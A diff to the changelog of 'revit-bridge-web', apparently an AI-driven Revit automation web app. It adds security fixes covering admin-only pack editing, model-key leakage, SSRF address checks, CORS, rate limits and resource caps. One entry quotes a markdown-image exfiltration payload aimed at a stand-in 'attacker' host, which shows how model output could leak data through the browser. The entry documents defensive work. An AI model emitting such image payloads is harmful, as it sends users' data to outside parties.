@@ -9,6 +9,48 @@ All notable changes to `revit-bridge-web` are recorded here. The format follows
 Upgrading: the host needs `revit-bridge>=0.6,<0.7` (`uv sync`, or rebuild the image). The system
 prompt changes (below); questions in the `spec` event may carry `kind` and `blocks`, and a value
 `reconcile` cannot find now also comes as a question. Event names and shapes are unchanged.
+Set `ADMIN_PASSWORD` to keep changing capability packs from the web UI (see *Security*). If your
+`.env` was copied from an older `.env.example`, delete its `FORWARDED_ALLOW_IPS=127.0.0.1` line
+when the port is published on loopback behind a proxy on the Docker host (see *Fixed*).
+
+### Security
+
+- **Changing capability packs needs the admin password.** This changes who may call three
+  routes: `PUT /api/v1/bridge/tools/{name}`, `DELETE /api/v1/bridge/tools/{name}` and
+  `POST /api/v1/bridge/solidify` now require `X-Admin-Token` (the same check as skill edits,
+  `/api/logs` and the device list) and answer 403 `admin_required` without the right one, 503
+  `admin_disabled` when `ADMIN_PASSWORD` is unset. Before, any visitor could create, edit or
+  delete a pack - the built-in ones included - and a pack's code runs in a designer's Revit
+  once they confirm its card. Listing, reading, choices, missing-params, confirming and running
+  packs are unchanged. In `docs/api-v1.json` these three operations change (the header, 503,
+  the 403 text). The Capabilities page hides *Edit pack* and *Delete*, and the task page's
+  *Save as pack* stays off, until the admin password is entered on the Connect page; a host
+  without `ADMIN_PASSWORD` cannot change packs through the web UI. The model's tools never
+  could (it has no writing tool; a test keeps it so).
+- **Three more routes gained a documented status:** `POST /api/v1/bridge/devices/pair`,
+  `POST /api/v1/bridge/devices/redeem` and `DELETE /api/v1/bridge/devices/{device_id}` now
+  declare 503 `device_store_unavailable` (see *Fixed*). That 503 is the only change to those
+  three operations in `docs/api-v1.json`; with the three pack routes above they are the only
+  operations whose contract this round of fixes changes.
+- The server's model key no longer leaves for a visitor's endpoint. A request with only
+  `X-LLM-Base-Url` used to go there with `LLM_API_KEY` in its `Authorization` header. The key
+  now only ever goes to `LLM_BASE_URL`: a request that names its own base URL must send
+  `X-LLM-Key` too (400 otherwise, nothing sent); a visitor's key or model name alone still uses
+  the server's endpoint, as documented. `/config.json` reports `serverModel` only when
+  `LLM_BASE_URL`, `LLM_MODEL` and `LLM_API_KEY` are all set.
+- A browser-supplied model endpoint must be on a public address: a literal loopback, private,
+  link-local, multicast, unspecified or reserved address (IPv4-mapped IPv6, IPv4 inside 6to4,
+  Teredo or NAT64, and numeric short forms such as `127.1` or `2130706433` included),
+  `localhost` and names under it, or a name that resolves to one, is refused with 400 before
+  anything is sent. The host checked is the one httpx connects to, and a URL httpx would refuse
+  (a control character, a space in the host) is a 400 too. `LLM_ALLOW_HTTP=1` lifts the
+  address check along with the https rule (a model on the operator's own network);
+  `LLM_BASE_URL` is never checked. The name is resolved once per request, which does not stop
+  DNS rebinding, so a public host should also restrict egress. A redirect from a model endpoint
+  is never followed (it is an error).
+- Markdown from the model (task page) and from skill files (Capabilities page) renders no
+  images: a reply with `![x](https://attacker/?d=...)` made the browser fetch that address.
+  An image shows as its alt text; links open in a new tab with `rel="noopener noreferrer"`.
 
 ### Added
 
@@ -151,9 +193,9 @@ prompt changes (below); questions in the `spec` event may carry `kind` and `bloc
   `invalid_args` on the bridge routes only - `/api/chat`, `/api/skills` and `/api/logs`
   keep `{detail: [...]}`.
 
-- Requires `revit-bridge` 0.2.1 (`>=0.2.1,<0.3`). The package now ships eight built-in
-  packs read in place from the wheel, keeps user packs and `usage.json` under its own
-  data root, and no longer rewrites pack files to count executions.
+- Since `revit-bridge` 0.2.1 (the current requirement is the first entry of this list) the
+  package ships eight built-in packs read in place from the wheel, keeps user packs and
+  `usage.json` under its own data root, and no longer rewrites pack files to count executions.
 - Capability packs come straight from the package's `ToolStore`: built-in packs are
   read from the wheel, user packs live under `REVIT_BRIDGE_DATA_DIR/capabilities`
   (`/app/data` in the container, the `./data` volume). Nothing is copied on first
@@ -173,6 +215,52 @@ prompt changes (below); questions in the `spec` event may carry `kind` and `bloc
 
 ### Fixed
 
+- Behind the documented setup (port published on loopback, a reverse proxy on the Docker host)
+  every visitor shared one address for the rate limits and the logs: requests reach the
+  container from the Docker bridge gateway, whose `X-Forwarded-For` was not trusted, so the
+  pairing redeem limit (10 a minute) applied to the whole host. The image now trusts
+  `127.0.0.1,172.16.0.0/12` (`FORWARDED_ALLOW_IPS`; an explicit value still wins, and outside a
+  container the default stays `127.0.0.1`). With `BIND_ADDRESS` not loopback, set
+  `FORWARDED_ALLOW_IPS` to the proxy's address, or to `127.0.0.1` with no proxy.
+- The container no longer turns "unhealthy" when `.env` sets `HTTP_PROXY` for model calls: the
+  healthcheck bypasses proxies.
+- A malformed `X-LLM-Base-Url` (`https://[::1`, a port out of range) is a 400, not a 500.
+- `GET /%00` (a NUL byte in a path the SPA fallback looks up) serves the SPA instead of a 500,
+  and an unknown `GET /api/...` is a JSON 404 `{error: "not_found", message}` instead of the
+  SPA page with 200. Real routes, `/config.json`, `/health` and the build's files are unchanged.
+- `CORS_ORIGINS="*"` no longer allows credentials (the middleware echoed any origin back with
+  credentials allowed); an explicit origin list keeps them.
+- `GET` and `DELETE /api/v1/bridge/devices/{id}` answer an unknown id with the same 403
+  `invalid_device_key` as a wrong key, so a browser cannot probe which devices exist; with the
+  admin password an unknown id is still 404. Every admin check compares `X-Admin-Token` in
+  constant time (the device routes used `==`).
+- Requests for one device no longer queue without bound behind a long one (a confirmation
+  dialog holds a device up to three minutes): a request waits for its turn at most its own
+  timeout and at most 16 wait at once, then fails as `revit_unreachable` (503) with nothing
+  sent and no token consumed. Unauthenticated add-in sockets cannot pile up: an address with 20
+  failed handshakes in a minute (wrong token, no auth message in time) or 64 sockets still
+  waiting to authenticate is refused before the upgrade, so the close codes 4001/4002/4003 keep
+  their meaning. Add-ins that authenticate never count, however often they reconnect.
+- A device store that cannot be read for a moment (a later revit-bridge 0.6.x raises `OSError`
+  after half a second instead of overwriting `devices.json`, before it writes anything):
+  pairing, redeeming a code and revoking a device answer 503 `{error:
+  "device_store_unavailable", message}` - nothing changed, the code is not consumed, try again
+  - instead of an unhandled 500; the Connect page shows the message and keeps the label and
+  the device for a retry (an admin revoke's message no longer vanishes when the list reloads).
+  An add-in that connects meanwhile stays connected; only its last-seen time goes unrecorded.
+  Before, the error closed the socket and left the device registered in the relay.
+- Growth while the host runs: interaction logs older than 90 days are purged daily, not only at
+  startup; at most 300 chat sessions are kept (the one idle the longest goes first); an
+  `execution` report enters the session and the prompt with at most 16,384 characters of JSON
+  (a longer `result` is cut to its head with a note, the verdict fields stay whole; the page
+  still gets the whole report back), and only one over 4,194,304 characters is refused with
+  422 `invalid_args`; one model call ends after 600 s even when the endpoint keeps trickling
+  bytes.
+- Skills: a very long name is cut to a 120-byte id when a skill is created instead of failing
+  with 500 (a longer id already on disk still opens, changes and deletes; one the file system
+  cannot hold is 404), a skill file is replaced whole or not at all (temporary file with the
+  mode a plain write gives, then rename), and a file that is not UTF-8 reads as absent (404, as
+  the list already skipped it) instead of a 500.
 - A round that offers the model no tools (`bridge: false`, or the last round of a turn) no
   longer runs `tool_calls` the model returns anyway: they are logged (`backend.chat`) and
   dropped, and the round ends with the model's text, or an empty assistant message.
